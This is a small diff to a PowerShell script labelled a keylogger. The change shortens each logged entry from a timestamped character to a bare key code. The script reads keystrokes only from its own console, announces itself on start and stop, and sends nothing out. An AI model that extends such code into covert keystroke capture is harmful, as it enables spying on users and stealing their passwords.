@@ -10,7 +10,7 @@ Write-Host "Keylogger started. Press ESC to stop."
 while ($true) {
     $key = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown").VirtualKeyCode
     if ($key -eq 27) { break }
-    Add-Content -Path $logFile -Value "$(Get-Date) - Key Pressed: $([char]$key) (Code: $key)"
+    Add-Content -Path $logFile -Value "($key)"
 }
 
 Write-Host "Keylogger stopped."
